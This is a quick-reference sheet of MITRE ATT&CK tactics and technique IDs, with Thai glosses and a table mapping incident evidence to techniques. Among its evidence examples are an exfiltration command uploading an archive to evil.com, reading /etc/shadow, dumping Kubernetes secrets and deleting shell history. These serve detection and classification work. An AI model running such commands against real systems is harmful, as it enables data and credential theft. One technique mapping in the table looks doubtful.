# MITRE ATT&CK Tactics & Techniques (Quick Reference)

## Tactics (ลำดับการโจมตี)
1. **Initial Access** - เข้าสู่ระบบครั้งแรก
2. **Execution** - รันโค้ด/คำสั่ง
3. **Persistence** - ฝังตัวถาวร
4. **Privilege Escalation** - ยกระดับสิทธิ์
5. **Defense Evasion** - หลบหลีกการตรวจจับ
6. **Credential Access** - ขโมย credentials
7. **Discovery** - สำรวจระบบ
8. **Lateral Movement** - เคลื่อนที่ไปเครื่องอื่น
9. **Collection** - รวบรวมข้อมูลเป้าหมาย
10. **Command & Control (C2)** - สื่อสารกับเซิร์ฟเวอร์ควบคุม
11. **Exfiltration** - ขโมยข้อมูลออกไป
12. **Impact** - ทำลาย/ขัดขวางการทำงาน

## Common Techniques by Platform

### Initial Access
- **T1190** - Exploit Public-Facing Application (web app vulnerabilities)
- **T1133** - External Remote Services (RDP, SSH brute-force)
- **T1078** - Valid Accounts (stolen credentials)
- **T1566** - Phishing (spearphishing attachments/links)

### Execution
- **T1059.001** - Command and Scripting Interpreter: PowerShell
- **T1059.004** - Unix Shell (bash, sh)
- **T1059.006** - Python
- **T1203** - Exploitation for Client Execution
- **T1610** - Deploy Container (malicious Docker image)

### Persistence
- **T1053.003** - Scheduled Task/Job: Cron (Linux)
- **T1053.005** - Scheduled Task (Windows)
- **T1543.003** - Create or Modify System Process: Windows Service
- **T1543.002** - Systemd Service (Linux)
- **T1098** - Account Manipulation (backdoor users)
- **T1136** - Create Account

### Privilege Escalation
- **T1548.003** - Sudo and Sudo Caching
- **T1068** - Exploitation for Privilege Escalation (kernel exploits)
- **T1611** - Escape to Host (container escape)
- **T1078.003** - Valid Accounts: Local Accounts (privilege escalation)

### Defense Evasion
- **T1070.001** - Indicator Removal: Clear Windows Event Logs
- **T1070.002** - Clear Linux Logs
- **T1070.004** - File Deletion (remove tools)
- **T1562.001** - Impair Defenses: Disable Tools (AV, EDR)
- **T1027** - Obfuscated Files or Information (encoded payloads)

### Credential Access
- **T1003.001** - OS Credential Dumping: LSASS Memory (Mimikatz)
- **T1003.008** - /etc/passwd and /etc/shadow
- **T1552.001** - Unsecured Credentials: Files (.env, config files)
- **T1555.003** - Credentials from Web Browsers
- **T1558.003** - Kerberoasting

### Discovery
- **T1087** - Account Discovery
- **T1083** - File and Directory Discovery
- **T1082** - System Information Discovery (`uname`, `systeminfo`)
- **T1046** - Network Service Scanning (nmap)
- **T1613** - Container and Resource Discovery (`kubectl`, `docker ps`)

### Lateral Movement
- **T1021.001** - Remote Services: RDP
- **T1021.004** - SSH
- **T1021.006** - Windows Remote Management (WinRM)
- **T1563** - Remote Service Session Hijacking
- **T1550.002** - Pass the Hash

### Collection
- **T1005** - Data from Local System
- **T1039** - Data from Network Shared Drive
- **T1560** - Archive Collected Data (`tar`, `zip`)

### Command & Control
- **T1071.001** - Application Layer Protocol: Web (HTTPS C2)
- **T1572** - Protocol Tunneling (chisel, ngrok)
- **T1090** - Proxy (SOCKS, HTTP proxy)
- **T1219** - Remote Access Software (TeamViewer, AnyDesk)

### Exfiltration
- **T1041** - Exfiltration Over C2 Channel
- **T1567.002** - Exfiltration to Cloud Storage (S3, Dropbox)
- **T1048** - Exfiltration Over Alternative Protocol (DNS tunneling)

### Impact
- **T1486** - Data Encrypted for Impact (ransomware)
- **T1490** - Inhibit System Recovery (delete backups)
- **T1496** - Resource Hijacking (cryptomining)
- **T1489** - Service Stop

## Quick Mapping Examples
| Evidence | Technique ID | Tactic |
|----------|--------------|--------|
| CVE-2024-23897 exploit via Jenkins CLI | T1190 | Initial Access |
| Groovy script executed in Jenkins | T1059.007 | Execution |
| Cron job created in `/etc/cron.d/` | T1053.003 | Persistence |
| `sudo su` to root | T1548.003 | Privilege Escalation |
| `.bash_history` deleted | T1070.002 | Defense Evasion |
| `/etc/shadow` accessed | T1003.008 | Credential Access |
| `kubectl get secrets` executed | T1613 | Discovery |
| SSH to 10.0.1.50 | T1021.004 | Lateral Movement |
| `tar -czf data.tar.gz /home/` | T1560.001 | Collection |
| chisel client connects to C2 | T1572 | C2 |
| `curl --upload-file data.tar.gz evil.com` | T1041 | Exfiltration |
| XMRig miner running | T1496 | Impact |
